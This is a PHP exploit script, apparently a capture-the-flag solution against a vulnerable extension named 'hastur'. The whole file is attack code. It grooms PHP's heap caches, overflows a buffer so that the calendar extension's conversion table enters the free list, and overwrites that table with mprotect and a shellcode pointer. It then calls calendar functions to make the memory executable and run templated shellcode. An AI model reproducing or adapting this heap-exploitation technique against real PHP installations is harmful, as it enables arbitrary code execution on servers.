<?php
define("DEBUG", 0);
define("SIZE", 128);

$cal_conversion_table = %%CAL_CONVERSION_TABLE%%;
$mprotect = %%MPROTECT%%;
$shellcode = "%%ESCAPED_SHELLCODE%%";

$payload = str_repeat("A", SIZE-1)."\0".
    pack("LLL", (8+SIZE) | 1, (8+SIZE) | 1, $cal_conversion_table);

$addr_shellcode = $cal_conversion_table + 0x10;

// reserve small blocks
$reserved_small_blocks = array_fill(0, 256, NULL);
for ($i = 0; $i < 256; $i++)
    array_push($reserved_small_blocks, str_repeat("@", SIZE-9));
// consume caches
$a = array_fill(0, 256, NULL);
for ($i = 0; $i < 256; $i++)
    array_push($a, str_repeat("@", SIZE-1));
// supply small blocks for caches
unset($reserved_small_blocks);
// supply target blocks for caches
$reserved_blocks = array_fill(0, 4, NULL);
for ($i = 0; $i < 4; $i++)
    $reserved_blocks[$i] = str_repeat("@", SIZE-1);
for ($i = count($reserved_blocks)-1; $i >= 0; $i--)
    unset($reserved_blocks[$i]);

$foo = str_repeat("1", SIZE-1);
$bar = str_repeat("2", SIZE-1);
$baz = str_repeat("3", SIZE-1);
if (DEBUG) {
    echo "[foo]\n";
    hastur_dump($foo);
}
unset($bar, $foo);
// make overflow; insert cal_conversion_table to cache list
$foo = hastur_ia_ia_handler($payload, '');
if (DEBUG) {
    echo "[foo]\n";
    hastur_dump($foo);
}
// pop; cal_conversion_table will be top of cache.
$bar = str_repeat("A", SIZE-1);
if (DEBUG) {
    echo "[bar]\n";
    hastur_dump($bar);
}
// overwrite to cal_conversion_table.
$baz = str_pad(pack("LL", $mprotect, $addr_shellcode).
               $shellcode, SIZE-1);
if (DEBUG) {
    echo "[baz]\n";
    hastur_dump($baz);
}

// let shellcode executable
$addr = $addr_shellcode & ~(4096-1);
$size = 8192;
$prot = 7;
cal_to_jd(0, $size, $prot, $addr);

echo "Let's fun\n";
flush();

// run shellcode
cal_from_jd(0, 0);
